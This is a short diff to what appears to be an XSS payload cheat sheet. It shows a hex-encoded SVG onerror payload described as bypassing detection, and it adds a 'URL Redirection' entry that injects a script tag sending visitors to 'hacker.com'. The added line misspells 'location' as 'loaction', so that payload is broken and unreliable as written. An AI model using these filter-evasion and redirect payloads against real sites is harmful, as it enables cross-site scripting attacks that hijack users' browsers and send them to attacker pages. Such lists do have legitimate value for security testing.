@@ -237,3 +237,8 @@ If you encounter a situation where the app strips typical event handlers like on
                   <svg><image href="x" onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;></svg>
 Here, the alert(1) function is hex-encoded to bypass detection.
 ```
+
+# URL Redirection
+```
+https://google.com/search=<script>document.loaction.href="hacker.com"</script>
+```
